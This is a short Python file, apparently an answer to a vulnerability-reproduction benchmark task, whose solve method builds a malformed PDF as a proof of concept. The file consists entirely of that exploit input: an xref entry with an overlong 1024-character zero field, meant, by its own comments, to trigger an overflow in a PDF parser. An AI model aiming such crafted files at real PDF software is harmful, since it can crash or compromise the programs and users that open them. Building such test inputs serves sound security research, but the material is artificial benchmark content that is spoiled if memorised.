import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Minimal valid-ish PDF structure with an overlong xref entry field
        header = b"%PDF-1.3\n1 0 obj\n<<>>\nendobj\n"
        offset_xref = len(header)

        K = 1024  # length of the overlong zero field to trigger the overflow
        entry0 = b"0000000000 65535 f \n"
        entry1 = b"0" * K + b" 00000 n \n"

        xref = b"xref\n0 2\n" + entry0 + entry1
        trailer = b"trailer\n<<>>\n"
        startxref = b"startxref\n" + str(offset_xref).encode("ascii") + b"\n%%EOF\n"

        poc = header + xref + trailer + startxref
        return poc
